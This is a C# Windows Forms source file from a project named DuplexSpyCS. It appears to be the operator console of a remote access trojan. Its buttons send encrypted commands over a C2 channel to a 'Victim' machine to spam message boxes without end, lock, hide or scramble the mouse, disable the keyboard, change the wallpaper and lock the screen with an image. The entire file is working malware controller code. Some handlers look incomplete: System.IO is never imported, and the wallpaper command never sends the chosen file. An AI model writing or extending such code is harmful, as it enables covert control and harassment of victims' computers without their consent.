using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmFunStuff : Form
    {
        private IniManager ini_manager;
        public Victim v;

        public frmFunStuff()
        {
            InitializeComponent();
        }

        void setup()
        {
            ini_manager = C2.ini_manager;

            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;

            //MsgBox
            if (ini_manager != null )
            {
                textBox1.Text = ini_manager.Read("FunStuff", "msgbox_caption");
                textBox2.Text = ini_manager.Read("FunStuff", "msgbox_text");
            }
            radioButton1.Checked = true;
            numericUpDown1.Value = 1;
            comboBox2.SelectedIndex = 6;
        }

        private void frmFunStuff_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBoxButtons btn = (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), comboBox1.Text.Replace(",", string.Empty), true);
            MessageBoxIcon icon = (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), comboBox2.Text, true);

            MessageBox.Show(textBox2.Text, textBox1.Text, btn, icon);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string mode = null;
            if (radioButton1.Checked)
                mode = "mul|" + numericUpDown1.Value.ToString();
            else if (radioButton2.Checked)
                mode = "inf|start";

            v.encSend(2, 0, $"fun|msg|{mode}|{Crypto.b64E2Str(textBox1.Text)}|{Crypto.b64E2Str(textBox2.Text)}|{comboBox1.Text}|{comboBox2.Text.Replace(",", string.Empty)}");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "fun|msg|inf|stop");
        }

        //LOCK MOUSE
        private void button4_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|lock");
        }
        //UNLOCK MOUSE
        private void button5_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|ulock");
        }
        //CRAZY MOUSE
        private void button6_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|crazy");
        }
        //CALM MOUSE
        private void button7_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|calm");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Image Files(*.jpg;*.png)|*.jpg;*.png";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox3.Text = ofd.FileName;
            }
        }

        private void button15_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Image Files(*.jpg;*.png)|*.jpg;*.png";
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox4.Text = ofd.FileName;
            }
        }

        private void button13_Click(object sender, EventArgs e)
        {
            string filename = textBox3.Text;
            if (!File.Exists(filename))
            {
                MessageBox.Show("File not found: " + filename, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            v.encSend(2, 0, "fun|wallpaper|change");
        }

        private void button14_Click(object sender, EventArgs e)
        {
            string filename = textBox4.Text;
            if (!File.Exists(filename))
            {
                MessageBox.Show("File not found: " + filename, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            v.encSend(2, 0, "fun|screen|lock|" + C2.ImageToBase64(filename));
        }

        private void button17_Click(object sender, EventArgs e)
        {

        }

        private void button16_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "fun|screen|ulock");
        }

        private void button18_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|hide");
        }

        private void button19_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "mouse|show");
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        //ENABLE KEYBOARD
        private void button20_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "keyboard|enable");
        }

        //DISABLE KEYBOARD
        private void button21_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "keyboard|disable");
        }

        //SMILE KEY
        private void button22_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "keyboard|smile");
        }

        //POKER FACE KEY
        private void button23_Click(object sender, EventArgs e)
        {
            v.encSend(2, 0, "keyboard|poker");
        }
    }
}
